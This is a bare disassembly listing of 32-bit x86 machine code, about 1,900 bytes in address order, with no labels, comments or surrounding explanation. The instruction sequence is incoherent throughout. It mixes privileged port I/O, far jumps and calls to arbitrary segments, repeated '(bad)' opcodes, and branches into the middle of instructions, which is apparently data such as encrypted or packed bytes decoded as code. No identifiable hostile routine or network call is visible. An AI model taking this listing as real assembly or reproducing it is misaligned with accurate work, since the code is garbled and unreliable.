  41f988:	mov    esp,0xde56cc5
  41f98d:	mov    al,ds:0xfa9e5dc1
  41f992:	sti    
  41f993:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f994:	add    BYTE PTR [eax],ch
  41f996:	lea    ecx,[ecx+0x11]
  41f999:	jp     0x41fa0c
  41f99b:	jo     0x41f969
  41f99d:	jb     0x41f95d
  41f99f:	xchg   ecx,eax
  41f9a0:	nop
  41f9a1:	mov    dh,0xf0
  41f9a3:	pushf  
  41f9a4:	rol    ebx,1
  41f9a6:	jmp    0x41f9ed
  41f9a8:	adc    DWORD PTR [edx+0x3c],esp
  41f9ab:	out    0x73,eax
  41f9ad:	fimul  DWORD PTR [ecx-0x38bc22c6]
  41f9b3:	ja     0x41f9dd
  41f9b5:	and    ebx,0x824c27fb
  41f9bb:	aad    0x60
  41f9bd:	inc    ecx
  41f9be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f9bf:	xchg   ebx,eax
  41f9c0:	scas   al,BYTE PTR es:[edi]
  41f9c1:	lods   al,BYTE PTR ds:[esi]
  41f9c2:	shl    BYTE PTR [ebp+0x49],cl
  41f9c5:	and    eax,0x64c237d5
  41f9ca:	std    
  41f9cb:	jns    0x41fa28
  41f9cd:	pop    esp
  41f9ce:	arpl   WORD PTR [esi-0x527c41e0],cx
  41f9d4:	push   ebp
  41f9d5:	fsubr  DWORD PTR [edx]
  41f9d7:	sub    BYTE PTR [ebp+0x55a89abf],bh
  41f9dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f9de:	iret   
  41f9df:	fbstp  TBYTE PTR [edi+0x59d1e57e]
  41f9e5:	int3   
  41f9e6:	and    BYTE PTR [eax],ch
  41f9e8:	daa    
  41f9e9:	xchg   ebp,eax
  41f9ea:	jns    0x41f9ae
  41f9ec:	add    dl,BYTE PTR [edx]
  41f9ee:	or     eax,0x3ece3de0
  41f9f3:	jmp    0x80eade8c
  41f9f8:	cmp    eax,0x36543693
  41f9fd:	into   
  41f9fe:	pop    esp
  41f9ff:	pop    ecx
  41fa00:	sub    al,0xdf
  41fa02:	cwde   
  41fa03:	pop    edx
  41fa04:	cdq    
  41fa05:	add    bl,0x84
  41fa08:	dec    ecx
  41fa09:	push   eax
  41fa0a:	dec    esp
  41fa0b:	cli    
  41fa0c:	jecxz  0x41fa00
  41fa0e:	aam    0x45
  41fa10:	arpl   WORD PTR [ebp+0x42],bp
  41fa13:	popf   
  41fa14:	xchg   ebx,eax
  41fa15:	js     0x41fa3d
  41fa17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fa18:	leave  
  41fa19:	outs   dx,BYTE PTR ds:[esi]
  41fa1a:	jge    0x41f9e5
  41fa1c:	push   ds
  41fa1d:	in     al,0xbd
  41fa1f:	adc    BYTE PTR [ebx-0x1c],cl
  41fa22:	icebp  
  41fa23:	ins    DWORD PTR es:[edi],dx
  41fa24:	jno    0x41fa73
  41fa26:	ins    BYTE PTR es:[edi],dx
  41fa27:	int    0xbf
  41fa29:	cmp    DWORD PTR [esi+0x27d9b7b0],ecx
  41fa2f:	arpl   WORD PTR [ecx+0x65],dx
  41fa32:	retf   0x5982
  41fa35:	and    BYTE PTR [esi+0x59],bl
  41fa38:	xor    DWORD PTR [esi],eax
  41fa3a:	or     DWORD PTR [ebp+0x2],eax
  41fa3d:	mov    al,ds:0x55159f14
  41fa42:	or     al,0x48
  41fa44:	sbb    eax,DWORD PTR [eax-0x27b0f5a9]
  41fa4a:	add    ebp,edi
  41fa4c:	cwde   
  41fa4d:	lahf   
  41fa4e:	or     ah,cl
  41fa50:	mov    ecx,0x3fade5ed
  41fa55:	xchg   ebx,eax
  41fa56:	mov    ebp,edx
  41fa58:	icebp  
  41fa59:	dec    ebp
  41fa5a:	enter  0xf4c3,0xfe
  41fa5e:	lods   al,BYTE PTR ds:[esi]
  41fa5f:	out    0xc2,eax
  41fa61:	xchg   ebx,eax
  41fa62:	mov    esp,0xb3a51a52
  41fa67:	push   ebx
  41fa68:	cmp    eax,0x12cdf010
  41fa6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fa6e:	jae    0x41fa0d
  41fa70:	jae    0x41fa37
  41fa72:	sub    ebx,ebx
  41fa74:	clc    
  41fa75:	xchg   ecx,eax
  41fa76:	inc    esi
  41fa77:	add    eax,0xa7950936
  41fa7c:	in     al,dx
  41fa7d:	pop    ebp
  41fa7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fa7f:	rcr    BYTE PTR [edx-0x18],1
  41fa82:	inc    ebp
  41fa83:	push   eax
  41fa84:	jp     0x41fa2a
  41fa86:	push   ds
  41fa87:	aad    0x2a
  41fa89:	jae    0x41fa25
  41fa8b:	cmp    ebp,DWORD PTR [ecx+0x4be7fd68]
  41fa91:	inc    edi
  41fa92:	fisttp WORD PTR [ebx-0x63]
  41fa95:	and    eax,0x3a84e0bd
  41fa9a:	in     al,dx
  41fa9b:	int3   
  41fa9c:	jle    0x41fb08
  41fa9e:	in     al,dx
  41fa9f:	rol    DWORD PTR [edx+0x790dd7d9],1
  41faa5:	in     eax,0x78
  41faa7:	stos   BYTE PTR es:[edi],al
  41faa8:	cmp    edx,DWORD PTR [esi+0x7ada0ea5]
  41faae:	lds    edx,FWORD PTR [ebp+0x13]
  41fab1:	dec    eax
  41fab2:	adc    BYTE PTR [edx+eiz*2],cl
  41fab5:	test   eax,0xa978e70d
  41faba:	and    al,0x6c
  41fabc:	fdivr  DWORD PTR [ebx+eax*2]
  41fabf:	neg    DWORD PTR [esi-0x7871e6f0]
  41fac5:	pusha  
  41fac6:	outs   dx,BYTE PTR ds:[esi]
  41fac7:	aaa    
  41fac8:	xor    eax,0x1e05a151
  41facd:	ja     0x41faeb
  41facf:	dec    esi
  41fad0:	sub    eax,0xf390a7f
  41fad5:	call   0x3a43:0x4fb52f
  41fadc:	pop    esi
  41fadd:	jg     0x41fb4e
  41fadf:	mov    edi,0xd3bec51a
  41fae4:	xor    DWORD PTR [edx+0x1132c535],edi
  41faea:	jg     0x41fb0f
  41faec:	push   eax
  41faed:	cmovno edx,DWORD PTR [eax]
  41faf0:	icebp  
  41faf1:	jmp    0x6447722f
  41faf6:	pop    ecx
  41faf7:	pop    esi
  41faf8:	iret   
  41faf9:	pusha  
  41fafa:	cmp    al,0x77
  41fafc:	and    BYTE PTR [edi+ebx*1+0x43],ah
  41fb00:	push   edx
  41fb01:	cli    
  41fb02:	test   DWORD PTR es:[esi+0x36],esp
  41fb06:	in     eax,0x4c
  41fb08:	retf   0xc483
  41fb0b:	enter  0x5c8b,0x86
  41fb0f:	xor    dl,bl
  41fb11:	dec    esi
  41fb12:	cs scas eax,DWORD PTR es:[edi]
  41fb14:	das    
  41fb15:	dec    ebp
  41fb16:	out    dx,al
  41fb17:	retf   
  41fb18:	mov    ch,0x1e
  41fb1a:	addr16 addr16 cwde 
  41fb1d:	imul   esi,DWORD PTR [ebx],0x6b68e7b4
  41fb23:	xchg   DWORD PTR [edi+ecx*1],esp
  41fb26:	mov    ebp,0x773a38e9
  41fb2b:	jmp    0x2cb3:0x870908fa
  41fb32:	ret    
  41fb33:	js     0x41fac5
  41fb35:	popa   
  41fb36:	ds cmp ecx,edi
  41fb39:	jp     0x41fad9
  41fb3b:	inc    edx
  41fb3c:	xor    BYTE PTR [eax*8+0x400dc6e8],ah
  41fb43:	cmp    al,0xea
  41fb45:	ins    BYTE PTR es:[edi],dx
  41fb46:	mov    bh,BYTE PTR [ecx-0x31]
  41fb49:	dec    esi
  41fb4a:	and    BYTE PTR [edx-0x20a07e91],dl
  41fb50:	sbb    al,BYTE PTR [edx-0x4be2e414]
  41fb56:	data16 adc al,BYTE PTR [eax]
  41fb59:	ss mov dl,0x41
  41fb5c:	inc    edx
  41fb5d:	jmp    0xee8f:0xe9d64a1e
  41fb64:	xchg   edi,eax
  41fb65:	imul   ecx,DWORD PTR [esi+0x20],0x69b5f587
  41fb6c:	ins    BYTE PTR es:[edi],dx
  41fb6d:	fild   DWORD PTR [eax]
  41fb6f:	(bad)  
  41fb71:	or     al,0x19
  41fb73:	call   0x5c6f:0xbd70e4ea
  41fb7a:	xchg   ecx,eax
  41fb7b:	scas   al,BYTE PTR es:[edi]
  41fb7c:	mov    esi,0xa419585a
  41fb81:	js     0x41fb37
  41fb83:	outs   dx,DWORD PTR ds:[esi]
  41fb84:	add    DWORD PTR [edi+0xc349060],edi
  41fb8a:	mov    dl,0xb4
  41fb8c:	inc    ecx
  41fb8d:	ins    BYTE PTR es:[edi],dx
  41fb8e:	(bad)  
  41fb90:	rol    DWORD PTR [edx+ebp*4],0x74
  41fb94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fb95:	aas    
  41fb96:	mov    ds:0x2f18ae9e,eax
  41fb9b:	push   esp
  41fb9c:	shl    cl,0x86
  41fb9f:	daa    
  41fba0:	cmp    ch,BYTE PTR [ecx+0x1c18fe5f]
  41fba6:	dec    ebx
  41fba7:	dec    edi
  41fba8:	cdq    
  41fba9:	cmp    eax,DWORD PTR [esi]
  41fbab:	leave  
  41fbac:	rcr    BYTE PTR [edx],0x81
  41fbaf:	jmp    0x41fb4e
  41fbb1:	pop    ds
  41fbb2:	or     ebp,DWORD PTR [esi]
  41fbb4:	iret   
  41fbb5:	idiv   DWORD PTR ds:0xcb08f7e3
  41fbbb:	imul   ecx,DWORD PTR [ecx],0x6ed133f1
  41fbc1:	pop    ebx
  41fbc2:	cmc    
  41fbc3:	sbb    bh,dl
  41fbc5:	mov    fs,esp
  41fbc7:	add    dl,bh
  41fbc9:	retf   0x4ee4
  41fbcc:	pop    esp
  41fbcd:	mov    esp,fs
  41fbcf:	imul   esp,DWORD PTR [ebx+0x226272d8],0x7f
  41fbd6:	xchg   ebx,eax
  41fbd7:	sahf   
  41fbd8:	pop    ds
  41fbd9:	cdq    
  41fbda:	pop    edx
  41fbdb:	mov    ah,0xd8
  41fbdd:	push   eax
  41fbdf:	retf   0xafc7
  41fbe2:	adc    BYTE PTR [edi+0x3e],dh
  41fbe5:	push   edi
  41fbe6:	lahf   
  41fbe7:	repz push 0x28
  41fbea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fbeb:	jmp    0x41fc5e
  41fbed:	aaa    
  41fbee:	les    esi,FWORD PTR [ebp+0x20f9ddba]
  41fbf4:	je     0x41fc35
  41fbf6:	inc    ebp
  41fbf7:	push   bx
  41fbf9:	inc    ebx
  41fbfa:	inc    esi
  41fbfb:	stc    
  41fbfc:	mov    ds:0x43bd0bda,eax
  41fc01:	es ins BYTE PTR es:[edi],dx
  41fc03:	inc    esi
  41fc04:	in     eax,dx
  41fc05:	inc    esp
  41fc06:	fdivr  QWORD PTR [ebp+0x1b6947c7]
  41fc0c:	(bad)  
  41fc0d:	jecxz  0x41fc3e
  41fc0f:	add    al,0xe0
  41fc11:	cdq    
  41fc12:	mov    ds:0xfb4475f0,eax
  41fc17:	outs   dx,BYTE PTR ds:[esi]
  41fc18:	daa    
  41fc19:	adc    DWORD PTR [esi],0x9039377c
  41fc1f:	add    eax,0xfd9b698c
  41fc24:	and    ch,ah
  41fc26:	cmp    DWORD PTR [eax+esi*2-0x63a43195],edx
  41fc2d:	push   0xffffff96
  41fc2f:	add    eax,0x1a27d61f
  41fc34:	int    0xbe
  41fc36:	add    al,0x36
  41fc38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc39:	aam    0xe3
  41fc3b:	jbe    0x41fc88
  41fc3d:	jmp    0x4a6d8f94
  41fc42:	repnz shr BYTE PTR [ebp-0x3e],cl
  41fc46:	int    0x24
  41fc48:	les    edx,FWORD PTR [eax]
  41fc4a:	mov    eax,ds:0x660fad10
  41fc4f:	int3   
  41fc50:	push   ebp
  41fc51:	add    eax,0x17ef30a2
  41fc56:	mov    cl,0xd8
  41fc58:	aad    0xc9
  41fc5a:	sub    BYTE PTR [eax],0xc5
  41fc5d:	cs sbb al,0x4
  41fc60:	out    0x38,al
  41fc62:	jg     0x41fc1e
  41fc64:	icebp  
  41fc65:	xchg   esp,eax
  41fc66:	cld    
  41fc67:	lahf   
  41fc68:	leave  
  41fc69:	je     0x41fcdb
  41fc6b:	sub    eax,0x155ad93
  41fc70:	xchg   ebx,eax
  41fc71:	push   ecx
  41fc72:	lea    ebp,[edx+0x3042593d]
  41fc78:	push   ss
  41fc79:	dec    ebx
  41fc7a:	mov    eax,0xdfaa1e
  41fc7f:	sub    DWORD PTR [edx-0x6dcf1aac],ecx
  41fc85:	xor    ah,bh
  41fc87:	adc    eax,0x9e52b37
  41fc8c:	repz stc 
  41fc8e:	arpl   WORD PTR [edx+0x6b295fb2],bp
  41fc94:	and    eax,0x4e90d02f
  41fc99:	lock sbb DWORD PTR [eax],esi
  41fc9c:	push   0x2c
  41fc9e:	xchg   ecx,eax
  41fc9f:	and    al,0xe8
  41fca1:	sbb    ch,BYTE PTR [ecx]
  41fca3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fca4:	xchg   edx,eax
  41fca5:	mov    al,ds:0x655a021d
  41fcaa:	popf   
  41fcab:	pop    ds
  41fcac:	jae    0x41fcb3
  41fcae:	rcl    cl,0x73
  41fcb1:	imul   ecx,edi,0x8c9a7ccb
  41fcb7:	in     al,0xd0
  41fcb9:	loope  0x41fd2c
  41fcbb:	ja     0x41fcdf
  41fcbd:	dec    ecx
  41fcbe:	std    
  41fcbf:	pop    eax
  41fcc0:	add    DWORD PTR [eax+0xbea73f6],0xffffffda
  41fcc7:	mov    bl,0x93
  41fcc9:	dec    ebp
  41fcca:	adc    ah,BYTE PTR [ecx+0x6f8d3e73]
  41fcd0:	mov    bl,BYTE PTR [ebp+0x20101764]
  41fcd6:	pop    edi
  41fcd7:	inc    esp
  41fcd8:	push   edi
  41fcd9:	gs mov ch,0xa0
  41fcdc:	ja     0x41fd56
  41fcde:	aad    0xcb
  41fce0:	icebp  
  41fce1:	aad    0xc3
  41fce3:	fmul   QWORD PTR [edi+0x2c94f2c6]
  41fce9:	std    
  41fcea:	rol    BYTE PTR [ebx+0x72],cl
  41fced:	fdiv   QWORD PTR [ecx-0x5dad3d46]
  41fcf3:	push   0x47
  41fcf5:	cmp    DWORD PTR [edi+0x2a719f1c],eax
  41fcfb:	fadd   st(1),st
  41fcfd:	pop    es
  41fcfe:	test   al,0xc0
  41fd00:	and    BYTE PTR [edi],0x92
  41fd03:	xchg   bl,al
  41fd05:	or     DWORD PTR [esi],edi
  41fd07:	push   ebp
  41fd08:	jmp    0x41fd77
  41fd0a:	js     0x41fd8b
  41fd0c:	sbb    BYTE PTR [ebp+0x4b],0x3d
  41fd10:	rol    eax,1
  41fd12:	cli    
  41fd13:	add    bl,BYTE PTR [edx+0x9c89e0a]
  41fd19:	(bad)  
  41fd1b:	dec    edi
  41fd1c:	push   ds
  41fd1d:	adc    al,0xa0
  41fd1f:	xchg   BYTE PTR [ebp+0x5],bl
  41fd22:	mov    DWORD PTR [eax],edi
  41fd24:	lock fidiv WORD PTR [ebx-0x2684c84a]
  41fd2b:	out    0x64,al
  41fd2d:	inc    esp
  41fd2e:	jb     0x41fd27
  41fd30:	dec    edx
  41fd31:	pop    ss
  41fd32:	std    
  41fd33:	xchg   edi,eax
  41fd34:	xor    eax,edx
  41fd36:	inc    esp
  41fd37:	push   0xffffff9f
  41fd39:	mov    al,0xa9
  41fd3b:	and    eax,0x5bb84952
  41fd40:	in     eax,dx
  41fd41:	sub    cl,dh
  41fd43:	xlat   BYTE PTR ds:[ebx]
  41fd44:	inc    eax
  41fd45:	es cmp eax,0x45f98fc7
  41fd4b:	shl    BYTE PTR [ebx+0x51f3b2ee],0x1
  41fd52:	arpl   WORD PTR [edi-0x80],di
  41fd55:	sahf   
  41fd56:	imul   ecx,DWORD PTR [edi-0x59d6bb36],0xffffffdf
  41fd5d:	cmc    
  41fd5e:	popf   
  41fd5f:	push   es
  41fd60:	jne    0x41fd5f
  41fd62:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  41fd64:	inc    ebp
  41fd65:	das    
  41fd66:	sbb    ah,dl
  41fd68:	cli    
  41fd69:	mov    BYTE PTR [edi+0x5b41d43d],ah
  41fd6f:	xchg   edi,eax
  41fd70:	inc    edi
  41fd71:	or     eax,0x331f91b9
  41fd76:	cmp    al,0x1f
  41fd78:	xchg   ecx,eax
  41fd79:	add    ecx,ecx
  41fd7b:	(bad)  
  41fd7d:	outs   dx,BYTE PTR ds:[esi]
  41fd7e:	adc    edx,ecx
  41fd80:	adc    bl,BYTE PTR [edx]
  41fd82:	jp     0x41fd81
  41fd84:	mov    dh,BYTE PTR [edx]
  41fd86:	jo     0x41fd0f
  41fd88:	xchg   esi,eax
  41fd89:	loopne 0x41fd92
  41fd8b:	jmp    0xe085:0x263ab6cc
  41fd92:	retf   0xac6e
  41fd95:	lods   eax,DWORD PTR ds:[esi]
  41fd96:	fisttp QWORD PTR [ebx]
  41fd98:	cmp    eax,0x8db88d3d
  41fd9d:	sbb    al,0x53
  41fd9f:	js     0x41fd48
  41fda1:	das    
  41fda2:	jns    0x41fd94
  41fda4:	push   ebx
  41fda5:	cmp    ah,0xd
  41fda8:	cmc    
  41fda9:	push   ds
  41fdaa:	sbb    al,0xe
  41fdac:	fs nop
  41fdae:	fucomp st(4)
  41fdb0:	mov    WORD PTR [ecx],?
  41fdb2:	out    dx,al
  41fdb3:	ins    DWORD PTR es:[edi],dx
  41fdb4:	mov    DWORD PTR [esi+0xb],ebp
  41fdb7:	add    BYTE PTR [edi-0x2df4fd97],0x92
  41fdbe:	test   eax,ebx
  41fdc0:	call   0x4cd2:0x4c5c510b
  41fdc7:	dec    esp
  41fdc8:	test   eax,0xa0c192aa
  41fdcd:	test   BYTE PTR [edi-0x14a13ea0],al
  41fdd3:	aas    
  41fdd4:	mov    esi,0x147bb43
  41fdd9:	inc    esi
  41fdda:	in     eax,0x2e
  41fddc:	data16 gs stc 
  41fddf:	mov    bl,0xc
  41fde1:	and    DWORD PTR [ebp-0x70],0xa0317337
  41fde8:	or     eax,0x3a502122
  41fded:	test   al,0xca
  41fdef:	cmp    BYTE PTR ds:0xc9f00183,dl
  41fdf5:	and    eax,0x40c741ad
  41fdfa:	dec    esp
  41fdfb:	ret    0x2924
  41fdfe:	or     al,0xa5
  41fe00:	jo     0x41fdd5
  41fe02:	icebp  
  41fe03:	mov    ah,0x89
  41fe05:	ffree  st(1)
  41fe07:	sbb    eax,0x2ca0bb43
  41fe0c:	in     eax,dx
  41fe0d:	scas   eax,DWORD PTR es:[edi]
  41fe0e:	stos   BYTE PTR es:[edi],al
  41fe0f:	mov    al,0x88
  41fe11:	test   al,0x3e
  41fe13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fe14:	sbb    al,0xb9
  41fe16:	and    BYTE PTR [esi-0x3ebf7def],0x7b
  41fe1d:	loop   0x41fdf8
  41fe1f:	loop   0x41fe34
  41fe21:	ds jns 0x41fe82
  41fe24:	mov    al,0xfb
  41fe26:	(bad)  
  41fe27:	aas    
  41fe28:	cmp    DWORD PTR [edi-0xd],ecx
  41fe2b:	sbb    ecx,esp
  41fe2d:	jg     0x41fe90
  41fe2f:	xchg   edx,eax
  41fe30:	pop    ebp
  41fe31:	aam    0x2
  41fe33:	je     0x41fe3f
  41fe35:	(bad)  
  41fe36:	sbb    BYTE PTR [eax-0x36f7880d],bl
  41fe3c:	imul   ebx,esp,0x2ff56a5b
  41fe42:	iret   
  41fe43:	(bad)  
  41fe44:	into   
  41fe45:	xor    esi,eax
  41fe47:	cdq    
  41fe48:	lods   al,BYTE PTR ds:[esi]
  41fe49:	mov    ch,0x7b
  41fe4b:	(bad)  
  41fe4d:	add    ebp,edi
  41fe4f:	les    edx,FWORD PTR [eax-0x28]
  41fe52:	fwait
  41fe53:	sbb    cl,BYTE PTR [ebx+0xa]
  41fe56:	mov    ebx,0xbcc39179
  41fe5b:	sbb    BYTE PTR [ebp+esi*8-0x1d],ch
  41fe5f:	ds ds xchg ebx,eax
  41fe62:	test   DWORD PTR [ebp+0x38],0xc3760c6
  41fe69:	adc    eax,DWORD PTR [ebp-0x5b]
  41fe6c:	aaa    
  41fe6d:	fnsave [ecx+ebx*4]
  41fe70:	loope  0x41fe7b
  41fe72:	lahf   
  41fe73:	sub    bl,BYTE PTR [ebp+0x76fbfd0f]
  41fe79:	xchg   edi,eax
  41fe7a:	std    
  41fe7b:	mov    dh,0x15
  41fe7d:	mov    ebx,0xcc6ec1c4
  41fe82:	xchg   ecx,eax
  41fe83:	popa   
  41fe84:	jne    0x41fee7
  41fe86:	pop    ebx
  41fe87:	popa   
  41fe88:	cdq    
  41fe89:	xchg   ebp,eax
  41fe8a:	in     eax,0x6a
  41fe8c:	push   esi
  41fe8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fe8e:	rol    dl,1
  41fe90:	mov    ebx,0xe0edb544
  41fe95:	push   cs
  41fe96:	cmp    BYTE PTR [edi+0x6e56493d],cl
  41fe9c:	imul   ebx,edi,0xffffffe2
  41fe9f:	jmp    0xab87:0x509bb7e6
  41fea6:	es in  eax,dx
  41fea8:	mov    DWORD PTR [eax-0x612f5027],esp
  41feae:	or     al,0x5a
  41feb0:	xchg   esi,eax
  41feb1:	dec    esi
  41feb2:	mov    al,0xe5
  41feb4:	xchg   edi,eax
  41feb5:	xor    BYTE PTR [edi],dh
  41feb7:	xchg   edi,edx
  41feb9:	mov    dh,0xcc
  41febb:	sub    eax,0x77ad2860
  41fec0:	call   0x5f24c5b4
  41fec5:	sahf   
  41fec6:	lahf   
  41fec7:	mov    ebp,0xfc84b9cc
  41fecc:	shr    ecx,1
  41fece:	ins    DWORD PTR es:[edi],dx
  41fecf:	jmp    0x991cfbd5
  41fed4:	and    esp,esi
  41fed6:	mov    ebp,0x64df30b
  41fedb:	inc    edi
  41fedc:	jle    0x41fe78
  41fede:	xchg   ebp,eax
  41fedf:	(bad)  
  41fee0:	xchg   esi,eax
  41fee1:	ret    0xfe51
  41fee4:	fcom   QWORD PTR [ecx+0x4145584c]
  41feea:	rcl    DWORD PTR [edi+0x16],0x35
  41feee:	mov    ch,0x43
  41fef0:	ins    DWORD PTR es:[edi],dx
  41fef1:	mov    ebx,0xcdd5b19f
  41fef6:	test   al,0xa9
  41fef8:	hlt    
  41fef9:	lea    eax,[edi+0x6d]
  41fefc:	lahf   
  41fefd:	xor    bl,bl
  41feff:	out    dx,eax
  41ff00:	mov    bh,0x89
  41ff02:	push   eax
  41ff03:	cmp    DWORD PTR [ebx],ebp
  41ff05:	loop   0x41ff50
  41ff07:	push   0x9301a558
  41ff0c:	jns    0x41feed
  41ff0e:	sub    ah,BYTE PTR [edi]
  41ff10:	inc    ebp
  41ff11:	pop    ecx
  41ff12:	and    BYTE PTR [edi+0x2c],0x6f
  41ff16:	fdiv   QWORD PTR [ebx-0x239ac845]
  41ff1c:	mov    esi,0xee33dd8b
  41ff21:	inc    edx
  41ff22:	inc    esi
  41ff23:	cdq    
  41ff24:	cmp    ch,BYTE PTR ds:0x3ee5d550
  41ff2a:	xchg   BYTE PTR [ebp-0x2d],bl
  41ff2d:	(bad)  
  41ff2e:	test   eax,0xe7db584d
  41ff33:	mov    edx,DWORD PTR [edi+0x16]
  41ff36:	gs test al,0x64
  41ff39:	aaa    
  41ff3a:	mov    edi,0x6949a504
  41ff3f:	xor    eax,DWORD PTR [edi]
  41ff41:	mov    ecx,0x39c8dfd9
  41ff46:	xor    cl,BYTE PTR [esi+eiz*8+0x58]
  41ff4a:	mov    edx,DWORD PTR [ebx+0x42835920]
  41ff50:	push   cs
  41ff51:	pop    edi
  41ff52:	inc    esp
  41ff53:	fst    QWORD PTR [esi+0x72]
  41ff56:	adc    dl,BYTE PTR ds:[edx-0x55d3241c]
  41ff5d:	cdq    
  41ff5e:	pop    ebx
  41ff5f:	daa    
  41ff60:	pop    esp
  41ff61:	(bad)  
  41ff63:	test   al,0xa3
  41ff65:	jge    0x41ffbf
  41ff67:	xchg   edx,eax
  41ff68:	add    bl,BYTE PTR [ecx-0x40]
  41ff6b:	scas   al,BYTE PTR es:[edi]
  41ff6c:	enter  0x2318,0xe8
  41ff70:	mov    cs,WORD PTR [edx+0x6b5daf9d]
  41ff76:	cli    
  41ff77:	stos   DWORD PTR es:[edi],eax
  41ff78:	cdq    
  41ff79:	les    ebx,FWORD PTR [ebx-0x3f]
  41ff7c:	sbb    ebp,edx
  41ff7e:	or     al,0x3e
  41ff80:	xor    edx,DWORD PTR [edi-0x7]
  41ff83:	push   es
  41ff84:	stos   BYTE PTR es:[edi],al
  41ff85:	pop    ebp
  41ff86:	push   edx
  41ff87:	je     0x41ffb4
  41ff89:	ret    0x517b
  41ff8c:	xor    ah,BYTE PTR [edi+0x28]
  41ff8f:	mov    eax,0xe1194c92
  41ff94:	lods   eax,DWORD PTR ds:[esi]
  41ff95:	adc    al,dh
  41ff97:	stos   BYTE PTR es:[edi],al
  41ff98:	nop
  41ff99:	adc    al,0x8a
  41ff9b:	iret   
  41ff9c:	mov    ds:0xaf7ba878,eax
  41ffa1:	(bad)  
  41ffa2:	fisttp DWORD PTR [eax-0x5f]
  41ffa5:	and    eax,0x7372cfcd
  41ffaa:	xor    eax,0x3bebb067
  41ffaf:	jbe    0x41ffbf
  41ffb1:	dec    esp
  41ffb2:	inc    ebp
  41ffb3:	add    al,0xe3
  41ffb5:	ror    edx,cl
  41ffb7:	mov    ah,0xd2
  41ffb9:	mov    ebp,0xf5cedf6c
  41ffbe:	sbb    eax,0x55a63f92
  41ffc3:	loop   0x41ffcb
  41ffc5:	cwde   
  41ffc6:	lods   eax,DWORD PTR ds:[esi]
  41ffc7:	daa    
  41ffc8:	aam    0x51
  41ffca:	xor    edx,DWORD PTR [ecx+0x1ef297b2]
  41ffd0:	stos   BYTE PTR es:[edi],al
  41ffd1:	std    
  41ffd2:	xlat   BYTE PTR ds:[ebx]
  41ffd3:	call   0xb0ad:0x66e97d05
  41ffda:	bnd jae 0x420001
  41ffdd:	ret    0x7c8
  41ffe0:	mov    esp,0x4b5d9040
  41ffe5:	mov    WORD PTR [ebx-0x7d80b21d],?
  41ffeb:	dec    esi
  41ffec:	sbb    al,BYTE PTR [edi]
  41ffee:	jnp    0x41ffad
  41fff0:	dec    esi
  41fff1:	jg     0x42003f
  41fff3:	stos   BYTE PTR es:[edi],al
  41fff4:	jge    0x41ff83
  41fff6:	ins    DWORD PTR es:[edi],dx
  41fff7:	add    al,BYTE PTR [ecx-0x6c]
  41fffa:	mov    ch,0x88
  41fffc:	not    DWORD PTR [ebx+0x44e1114d]
  420002:	mov    bl,0xce
  420004:	(bad)  
  420005:	jge    0x41ffd9
  420007:	cmp    al,ah
  420009:	or     DWORD PTR [esi+0x0],esp
  42000c:	lds    esi,FWORD PTR [eax+0x68d4c8b3]
  420012:	mov    ebp,0x900b4bb0
  420017:	inc    edi
  420018:	mov    eax,ds:0xb0587515
  42001d:	add    esp,DWORD PTR [edx-0x6c]
  420020:	rcl    DWORD PTR [eax-0x71],0x18
  420024:	jo     0x41ffe3
  420026:	xchg   ecx,eax
  420027:	sbb    ah,BYTE PTR [edi]
  420029:	pop    edx
  42002a:	test   al,0x19
  42002c:	sbb    esi,ebp
  42002e:	mov    ds:0xeaa7ba3c,eax
  420033:	xchg   esp,eax
  420034:	sub    BYTE PTR [ebx+0x70fc78e3],dh
  42003a:	jmp    0x420079
  42003c:	dec    esi
  42003d:	cmp    esp,DWORD PTR [esi]
  42003f:	sbb    al,0x34
  420041:	jmp    0x2541:0xa559e271
  420048:	inc    eax
  420049:	inc    esp
  42004a:	cmp    eax,0x39309179
  42004f:	fcomp  QWORD PTR [edi-0x70]
  420052:	ret    0x5fb3
  420055:	push   ebp
  420056:	add    esi,DWORD PTR [esi+edi*4+0xa592ad8]
  42005d:	in     eax,dx
  42005e:	sub    DWORD PTR [ebx+0x48548307],ecx
  420064:	jb     0x4200ae
  420066:	dec    BYTE PTR [ebx+eax*2-0x42]
  42006a:	pusha  
  42006b:	xor    DWORD PTR [esi],ecx
  42006d:	fisub  WORD PTR [ebx-0x15d22353]
  420073:	push   edx
  420074:	aaa    
  420075:	xor    eax,0x1a507719
  42007a:	sti    
  42007b:	xor    al,0x78
  42007d:	xchg   BYTE PTR [esi],bh
  42007f:	mov    ds:0x7c5a2bc0,al
  420084:	(bad)  [ecx-0x29b8576b]
  42008a:	div    BYTE PTR fs:[eax]
  42008d:	inc    ebp
  42008e:	sub    eax,0x2ffbfb29
  420093:	push   ecx
  420094:	sub    BYTE PTR [edx],cl
  420096:	xor    al,0x14
  420098:	push   0x98911ac4
  42009d:	aam    0x94
  42009f:	imul   edi,ebx,0xf10ab8a1
  4200a5:	cmp    esp,DWORD PTR [esi+0x6f]
  4200a8:	sahf   
  4200a9:	push   eax
  4200aa:	dec    eax
  4200ab:	out    dx,eax
  4200ac:	jno    0x420030
  4200ae:	fcomi  st,st(7)
  4200b0:	add    eax,0x847680f0
  4200b5:	jg     0x4200cc
  4200b7:	xchg   BYTE PTR ds:0x79f1b557,ch
  4200bd:	add    edi,DWORD PTR [ecx+edx*8]
  4200c0:	sub    ebx,edi
  4200c2:	xchg   esi,eax
  4200c3:	xor    BYTE PTR gs:[eax+0x6caf802e],ch
  4200ca:	stos   DWORD PTR es:[edi],eax
  4200cb:	pop    ebp
  4200cc:	mov    cl,0x34
  4200ce:	cdq    
  4200cf:	mov    ah,0xb1
  4200d1:	dec    edx
  4200d2:	and    ecx,DWORD PTR [edi+0x29]
  4200d5:	cdq    
  4200d6:	test   DWORD PTR [ebx-0x65],esp
  4200d9:	push   esp
